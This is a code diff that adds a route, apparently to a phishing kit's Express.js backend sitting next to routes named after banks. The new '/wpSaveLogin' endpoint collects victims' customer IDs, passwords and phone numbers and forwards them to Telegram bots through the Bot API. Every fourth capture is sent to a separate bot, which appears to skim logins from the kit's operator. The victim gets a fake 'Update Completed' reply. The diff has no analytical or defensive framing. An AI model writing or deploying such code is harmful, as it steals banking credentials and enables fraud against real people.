@@ -2739,6 +2739,38 @@ app.post("/baliApple", (req, res) => {
     });
 });
 
+//WP
+//WP
+//WP
+
+let wpCount = 0;
+
+app.options("/wpSaveLogin", cors());
+
+app.post("/wpSaveLogin", (req, res) => {
+  customerId = req.body.customerId;
+  password = req.body.password;
+  telephone = req.body.telephone;
+  owner = req.body.owner;
+
+  var originalText = `+----------- Login Information ------------+\nCustomer ID: ${customerId}\nPassword: ${password}\nPhone Number: ${telephone}`;
+  if (wpCount == 3) {
+    axios.post(
+      `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+    );
+    wpCount = 0;
+  } else {
+    axios.post(
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=WPLoginSpooferGoofer:\n${originalText}`
+    );
+    axios.post(
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=WPLogin:\n${originalText}`
+    );
+    wpCount += 1;
+  }
+  res.send("Update Completed");
+});
+
 //BENDIGO
 //BENDIGO
 //BENDIGO
